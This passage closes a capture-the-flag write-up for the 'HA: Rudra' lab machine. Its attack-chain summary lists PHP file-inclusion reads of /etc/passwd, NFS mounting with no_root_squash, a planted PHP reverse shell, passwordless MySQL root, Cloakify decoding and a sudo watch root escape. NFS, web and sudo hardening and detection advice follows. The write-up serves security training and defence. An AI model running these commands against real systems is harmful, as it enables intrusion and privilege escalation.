  → curl /robots.txt → Disallow: /nandi.php
  → curl "/nandi.php" → "include(): Filename cannot be empty"  <=== LFI
  → ?file=/etc/passwd → users rudra, shivay, mahakaal
  → php://filter/convert.base64-encode/resource=nandi.php → include($_GET['file'])
  → /etc/exports via LFI → rw,no_root_squash
  → showmount -e; mount -t nfs IP:/home/shivay /tmp/ignite → mahadev.txt
  → cp php-reverse-shell.php /tmp/ignite/shell.php   (writes to the TARGET)
  → nc -lvnp 4444 ; curl "/nandi.php?file=/home/shivay/shell.php" → www-data
  → ss -tulnp → 127.0.0.1:3306 mysqld
  → mysql -u root (no password) → mahadev.hint → "check in media filesystem"
  → cat /media/pwd → 8 distinct emoji, 30 symbols → Cloakify
  → cloakifyFactory.py → 2 (decloakify) → /root/pwd → /root/decodedpwd → no noise → cipher 3 = emoji
  → mahakaal:kalbhairav
  → ssh mahakaal@IP
  → sudo -l → (ALL) NOPASSWD: /usr/bin/watch
  → sudo watch -x sh -c 'reset; exec sh' → uid=0(root)
  → cat /root/flag.txt
```

---

## 11. Defensive lessons (blue team)

### NFS hardening — the primary lesson

1. **Never export with `*`.** Always name the clients:

   ```text
   # BAD
   /home/shivay  *(rw,sync,no_subtree_check,no_root_squash)

   # GOOD
   /home/shivay  192.168.56.20(rw,sync,no_subtree_check,root_squash)
   ```

2. **Never use `no_root_squash`.** It converts "member of the `lxd`/`docker`
   group" style escalation into "any root on any permitted client owns your
   files". If you need anonymous mapping, prefer `all_squash,anonuid=1001`.
3. **Do not export home directories at all.** Export a dedicated
   `/srv/share/data` with the *minimum* permission set.
4. **Mount read-only (`ro`) unless you need writes.** Most NFS use cases are
   distribution, not collaboration.
5. **Audit what is exported, continuously:**

   ```bash
   showmount -e localhost
   cat /etc/exports
   exportfs -v
   rpcinfo -p localhost
   ```

   And from the network side — run `nmap --script=nfs-showmount` against your own
   subnets monthly. An NFS export you forgot about is a standing data breach.
6. **Prefer NFSv4 with Kerberos (`sec=krb5p`)** instead of IP-based trust, which
   is trivially spoofed on a flat network.

### Web application hardening

7. **Validate include targets with an allow-list**, not a deny-list:

   ```php
   $pages = ['home' => 'pages/home.php', 'about' => 'pages/about.php'];
   $key   = $_GET['file'] ?? 'home';
   if (!array_key_exists($key, $pages)) { http_response_code(400); exit; }
   include $pages[$key];
   ```

   A deny-list (`str_replace('../','')`) is always bypassable — `....//`,
   `%2e%2e%2f`, absolute paths, null bytes on old PHP.
8. **Turn off `display_errors`.** The `include()` warning in §2.3 gave away both
   the vulnerability *and* the absolute path. In production:
   `display_errors=Off`, `log_errors=On`, `error_log=/var/log/php/error.log`.
9. **Delete `robots.txt` entries that name private scripts** — or better, delete
   the scripts. `Disallow:` is a *request*, not a control.
10. **Run your own content discovery.** `gobuster dir -u https://prod.example.com
    -w big.txt -x php,txt,bak,zip` once a month. If you can find it, so can an
    attacker.

### Local hardening

11. **No empty database passwords. Ever.** `mysql -u root` returning a prompt-less
    login as `www-data` means every web compromise becomes a full data breach.
    Use `mysql_secure_installation` on every deploy.
12. **Secrets must not sit in world-readable files.** `/media/pwd` was `644`.
    Encoding it as emoji does **not** make it secret — Cloakify is a *public*
    tool with a *public* cipher list. Obscurity through an open-source encoder is
    still obscurity, not security. Use a secrets manager, or at minimum
    `chmod 600` plus a dedicated owner.
13. **Audit `sudo -l` for every account:**

    ```bash
    for u in $(cut -d: -f1 /etc/passwd); do sudo -l -U "$u" 2>/dev/null; done | grep -i nopasswd
    ```

    Cross-reference every result against **GTFOBins**. Binaries that can execute
    other programs (`watch`, `find`, `less`, `more`, `vim`, `python`, `perl`,
    `awk`, `env`, `ftp`, `gdb`, `man`, `nmap`, `tar`, `zip`, `make`, `git`) must
    never appear with `NOPASSWD`.
14. **Detect the chain.** High-value alerts for this box:
    - `nfsd` connections from unexpected client IPs.
    - Apache child (`www-data`) spawning `/bin/sh` or `/bin/bash` — the single
      loudest indicator of a web shell.
    - `mysqld` client connections originating from the Apache user.
    - `sudo` invocations of `watch` with `-x`.
    - `sshd` login for an account immediately after a `www-data` shell opened.

---

## 12. References

- **Repository primer** — the fundamentals behind every command in this document: [`docs/CONCEPTS.md`](../../docs/CONCEPTS.md)

- VulnHub entry: <https://vulnhub.com/entry/ha-rudra,386/>
- Official walkthrough (Hacking Articles): <https://www.hackingarticles.in/ha-rudra-vulnhub-walkthrough/>
- Anushibin John Joseph, "HA: Rudra — Walkthrough": <https://anushibin.wordpress.com/2019-10-26/ha-rudra%E2%80%8A-%E2%80%8Awalkthrough/>
- Mirror of the official walkthrough: <https://nwpc-ch.org/exploits/ha-rudra-vulnhub-walkthrough>
- Cloakify (TryCatchHCF) — the emoji data-exfiltration tool used here: <https://github.com/TryCatchHCF/Cloakify>
- DEF CON 24 — "Cloakify: Data Exfiltration & Infiltration In Plain Sight": <https://github.com/TryCatchHCF/Cloakify/tree/master/DefCon24Slides>
- GTFOBins — `watch`: <https://gtfobins.github.io/gtfobins/watch/>
- GTFOBins home: <https://gtfobins.github.io/>
- `exports(5)` man page (`root_squash`, `no_subtree_check`): <https://man7.org/linux/man-pages/man5/exports.5.html>
- HackTricks — NFS no_root_squash / misconfiguration: <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe>
- PayloadsAllTheThings — File Inclusion: <https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion>
- PHP wrappers reference: <https://www.php.net/manual/en/wrappers.php.php>
- Repository guides: [`docs/TOOLS.md`](../../docs/TOOLS.md) · [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) · [`docs/BEGINNER-PATH.md`](../../docs/BEGINNER-PATH.md)

---

## 13. Screenshot checklist

Screenshots go in [`images/`](images/) beside this file:

| # | File | Section | What it must show |
| --- | --- | --- | --- |
| 01 | `01-netdiscover.png` | 1 | `netdiscover` with the target IP + MAC |
| 02 | `02-nmap-nfs.png` | 2.1 | `nmap -A -p-` with ports 22/80/111/2049 **and** the `rpcinfo` block; ideally `nfs-showmount` too |
| 03 | `03-lfi-discovery.png` | 2.3 | `robots.txt` contents and the `include(): Filename cannot be empty` warning |
| 04 | `04-nfs-mount.png` | 4.1–4.2 | `showmount -e`, `mount -t nfs`, and `cat mahadev.txt` |
| 05 | `05-shell.png` | 4.4–4.5 | `nc -lvnp 4444` catching the shell, then `id` → `www-data` |
| 06 | `06-mysql-hint.png` | 5.1–5.2 | `ss -tulnp` showing `127.0.0.1:3306`, then `SELECT * FROM hint;` |
| 07 | `07-cloakify.png` | 6.3 | `cloakifyFactory.py` menu with choice `2`, then `cat /root/decodedpwd` |
| 08 | `08-root-flag.png` | 8.3–8.4 | `sudo watch -x sh -c 'reset; exec sh'`, `id`, and `cat /root/flag.txt` |

> **How to capture on Kali:** `flameshot gui` or `gnome-screenshot -a`. Save as
> PNG with the exact filenames above so the inline links resolve.
>
> **Terminal readability:** Cloakify Factory's ASCII banner and the MySQL prompt
> both photograph badly at default font size. Bump your terminal to 12–14 pt
> before capturing.

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
